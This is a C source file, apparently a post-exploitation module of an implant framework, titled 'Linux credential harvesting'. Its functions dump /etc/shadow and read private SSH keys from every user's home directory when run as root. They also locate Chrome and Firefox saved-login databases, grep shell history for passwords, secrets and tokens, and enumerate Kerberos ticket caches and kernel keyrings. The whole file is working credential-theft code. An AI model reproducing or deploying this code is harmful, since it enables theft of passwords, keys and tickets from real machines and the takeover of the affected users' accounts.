/**
 * Linux credential harvesting
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include "../../include/postex.h"

int cred_shadow(char *output, size_t output_size) {
    FILE *f = fopen("/etc/shadow", "r");
    if (!f) {
        snprintf(output, output_size, "Cannot read /etc/shadow: %s\n", strerror(errno));
        return -1;
    }

    size_t offset = 0;
    char line[512];
    while (fgets(line, sizeof(line), f) && offset < output_size - 512) {
        offset += snprintf(output + offset, output_size - offset, "%s", line);
    }
    fclose(f);
    return 0;
}

static void append_ssh_dir(const char *dir, char *output, size_t output_size, size_t *offset) {
    const char *keys[] = {"id_rsa", "id_ecdsa", "id_ed25519", "id_dsa", NULL};
    for (int i = 0; keys[i]; i++) {
        char path[512];
        snprintf(path, sizeof(path), "%s/%s", dir, keys[i]);
        if (access(path, R_OK) == 0) {
            *offset += snprintf(output + *offset, output_size - *offset, "[+] %s\n", path);
            FILE *kf = fopen(path, "r");
            if (kf) {
                char line[256];
                while (fgets(line, sizeof(line), kf) && *offset < output_size - 256)
                    *offset += snprintf(output + *offset, output_size - *offset, "%s", line);
                fclose(kf);
            }
        }
    }
}

int cred_ssh_keys(char *output, size_t output_size) {
    size_t offset = 0;
    const char *home = getenv("HOME");
    if (!home) home = "/root";

    char ssh_dir[512];
    snprintf(ssh_dir, sizeof(ssh_dir), "%s/.ssh", home);
    append_ssh_dir(ssh_dir, output, output_size, &offset);

    if (geteuid() == 0) {
        append_ssh_dir("/root/.ssh", output, output_size, &offset);
        DIR *d = opendir("/home");
        if (d) {
            struct dirent *ent;
            while ((ent = readdir(d)) != NULL) {
                if (ent->d_name[0] == '.') continue;
                char udir[512];
                snprintf(udir, sizeof(udir), "/home/%s/.ssh", ent->d_name);
                append_ssh_dir(udir, output, output_size, &offset);
            }
            closedir(d);
        }
    }
    return 0;
}

int cred_browser_linux(char *output, size_t output_size) {
    size_t offset = 0;
    const char *home = getenv("HOME");
    if (!home) home = "/root";

    const char *chrome_paths[] = {
        "%s/.config/google-chrome/Default/Login Data",
        "%s/.config/chromium/Default/Login Data",
        NULL
    };

    for (int i = 0; chrome_paths[i]; i++) {
        char path[512];
        snprintf(path, sizeof(path), chrome_paths[i], home);
        if (access(path, R_OK) == 0) {
            offset += snprintf(output + offset, output_size - offset,
                               "[+] Chrome DB: %s\n", path);
        }
    }

    char ff_glob[512];
    snprintf(ff_glob, sizeof(ff_glob), "%s/.mozilla/firefox", home);
    DIR *d = opendir(ff_glob);
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) != NULL) {
            if (strstr(ent->d_name, ".default")) {
                char login[512], keydb[512];
                snprintf(login, sizeof(login), "%s/%s/logins.json", ff_glob, ent->d_name);
                snprintf(keydb, sizeof(keydb), "%s/%s/key4.db", ff_glob, ent->d_name);
                if (access(login, R_OK) == 0)
                    offset += snprintf(output + offset, output_size - offset,
                                       "[+] Firefox logins: %s\n", login);
                if (access(keydb, R_OK) == 0)
                    offset += snprintf(output + offset, output_size - offset,
                                       "[+] Firefox key4.db: %s\n", keydb);
            }
        }
        closedir(d);
    }
    return 0;
}

int cred_history(char *output, size_t output_size) {
    size_t offset = 0;
    const char *home = getenv("HOME");
    if (!home) home = "/root";

    const char *hist_files[] = {
        "%s/.bash_history", "%s/.zsh_history", "%s/.history", NULL
    };

    for (int i = 0; hist_files[i]; i++) {
        char path[512];
        snprintf(path, sizeof(path), hist_files[i], home);
        FILE *f = fopen(path, "r");
        if (!f) continue;
        offset += snprintf(output + offset, output_size - offset, "=== %s ===\n", path);
        char line[512];
        while (fgets(line, sizeof(line), f) && offset < output_size - 512) {
            if (strstr(line, "pass") || strstr(line, "PASS") ||
                strstr(line, "secret") || strstr(line, "token")) {
                offset += snprintf(output + offset, output_size - offset, "%s", line);
            }
        }
        fclose(f);
    }
    return 0;
}

int cred_proc_maps(char *output, size_t output_size) {
    FILE *f = fopen("/proc/self/maps", "r");
    if (!f) {
        snprintf(output, output_size, "Cannot read /proc/self/maps: %s\n", strerror(errno));
        return -1;
    }

    size_t offset = 0;
    char line[512];
    while (fgets(line, sizeof(line), f) && offset < output_size - 512) {
        if (strstr(line, "[heap]") || strstr(line, "stack") ||
            strstr(line, ".so") || strstr(line, "anon")) {
            offset += snprintf(output + offset, output_size - offset, "%s", line);
        }
    }
    fclose(f);
    return 0;
}

int cred_kerberos_caches(char *output, size_t output_size) {
    DIR *d;
    struct dirent *entry;
    size_t offset = 0;

    d = opendir("/tmp");
    if (d) {
        while ((entry = readdir(d)) != NULL) {
            if (strncmp(entry->d_name, "krb5cc_", 7) == 0) {
                offset += (size_t)snprintf(output + offset, output_size - offset,
                    "Cache: /tmp/%s\n", entry->d_name);
                if (offset >= output_size - 64) break;
            }
        }
        closedir(d);
    }

    const char *ccname = getenv("KRB5CCNAME");
    if (ccname) {
        offset += (size_t)snprintf(output + offset, output_size - offset,
            "KRB5CCNAME: %s\n", ccname);
    }

    FILE *f = fopen("/proc/keys", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "keyring") || strstr(line, "krb")) {
                offset += (size_t)snprintf(output + offset, output_size - offset, "%s", line);
                if (offset >= output_size - 64) break;
            }
        }
        fclose(f);
    }

    if (offset == 0)
        strncpy(output, "No Kerberos credential caches found", output_size - 1);
    output[output_size - 1] = '\0';
    return 0;
}

int cred_dpapi_linux(char *output, size_t output_size) {
    snprintf(output, output_size,
        "DPAPI is Windows-specific. Linux alternatives:\n"
        "  - TASK_HASHDUMP (/etc/shadow)\n"
        "  - TASK_BROWSER_CREDS (Chrome/Firefox stores)\n"
        "  - TASK_KERBEROS_TICKETS (/tmp/krb5cc_*)\n\n");
    size_t offset = strlen(output);
    snprintf(output + offset, output_size - offset,
             "=== /proc/self/maps (heap/anon) ===\n");
    offset = strlen(output);
    cred_proc_maps(output + offset, output_size - offset);
    return 0;
}

int cred_keyring(char *output, size_t output_size) {
    size_t offset = 0;

    /* Kerberos caches from /tmp */
    DIR *d = opendir("/tmp");
    if (d) {
        struct dirent *entry;
        while ((entry = readdir(d)) != NULL) {
            if (strncmp(entry->d_name, "krb5cc_", 7) == 0) {
                offset += (size_t)snprintf(output + offset, output_size - offset,
                    "Cache: /tmp/%s\n", entry->d_name);
                if (offset >= output_size - 256) break;
            }
        }
        closedir(d);
    }

    const char *ccname = getenv("KRB5CCNAME");
    if (ccname) {
        offset += (size_t)snprintf(output + offset, output_size - offset,
            "KRB5CCNAME: %s\n", ccname);
    }

    FILE *f = fopen("/proc/keys", "r");
    if (f) {
        char line[256];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "keyring") || strstr(line, "krb")) {
                offset += (size_t)snprintf(output + offset, output_size - offset, "%s", line);
                if (offset >= output_size - 256) break;
            }
        }
        fclose(f);
    }

    const char *uid = getenv("UID");
    char keyring_dir[256];
    if (uid && uid[0])
        snprintf(keyring_dir, sizeof(keyring_dir), "/proc/%s/keyring", uid);
    else
        snprintf(keyring_dir, sizeof(keyring_dir), "/proc/self/keyring");

    d = opendir(keyring_dir);
    if (d) {
        struct dirent *ent;
        while ((ent = readdir(d)) != NULL) {
            if (ent->d_name[0] == '.') continue;
            char path[512];
            snprintf(path, sizeof(path), "%s/%s", keyring_dir, ent->d_name);
            offset += (size_t)snprintf(output + offset, output_size - offset,
                           "[+] keyring entry: %s\n", path);
            if (offset >= output_size - 256) break;
        }
        closedir(d);
    }

    if (offset == 0)
        strncpy(output, "No Kerberos credential caches found", output_size - 1);
    output[output_size - 1] = '\0';
    return 0;
}
